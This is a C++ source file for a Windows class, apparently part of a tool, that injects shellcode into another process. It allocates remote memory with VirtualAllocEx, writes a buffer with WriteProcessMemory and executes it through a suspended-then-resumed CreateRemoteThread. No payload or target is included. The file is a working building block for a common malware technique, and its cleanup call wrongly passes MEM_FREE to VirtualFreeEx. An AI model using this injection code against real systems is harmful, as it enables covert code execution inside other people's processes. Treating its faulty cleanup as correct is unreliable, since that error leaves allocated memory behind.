#include "InjectShellcode.h"
#include <stdio.h>

InjectShellcode::InjectShellcode()
{
}

InjectShellcode::InjectShellcode(const InjectShellcode&)
{
}

InjectShellcode::~InjectShellcode()
{
}

void InjectShellcode::setProcessHandle(HANDLE processHandle)
{
	this->processHandle = processHandle;
}

HANDLE InjectShellcode::getProcessHandle()
{
	return this->processHandle;
}

LPVOID InjectShellcode::mapBufferIntoProcess(LPBYTE buffer, SIZE_T buffer_size, DWORD protect)
{

	LPVOID remoteAddress = VirtualAllocEx(this->processHandle, NULL, buffer_size, MEM_COMMIT | MEM_RESERVE, protect);
	if (remoteAddress == NULL) {
		printf("Error. Can't alocate memory.\n");
		return NULL;
	}
	if (!WriteProcessMemory(this->processHandle, remoteAddress, buffer, buffer_size, NULL)) {
		VirtualFreeEx(this->processHandle, remoteAddress, buffer_size, MEM_FREE);
		return NULL;
	}
	return remoteAddress;
}

bool InjectShellcode::runShellcodeIntoNewThread(LPVOID remoteShellcodePointer)
{

	printf("Shellcode run");
	NTSTATUS status = NULL;
	//create a new thread for the injected code:
	LPTHREAD_START_ROUTINE routine = (LPTHREAD_START_ROUTINE)remoteShellcodePointer;

	DWORD threadId = NULL;
	HANDLE hMyThread = NULL;
	if ((hMyThread = CreateRemoteThread(this->processHandle, NULL, NULL, routine, NULL, CREATE_SUSPENDED, &threadId)) == NULL) {
		printf("Failed createRemoteThread, status : %x\n", GetLastError());
		return false;
	}
	printf("Created remote thread , id = %x\n", threadId);
	ResumeThread(hMyThread);
	printf("Resuming thread. \n");

	return true;
}
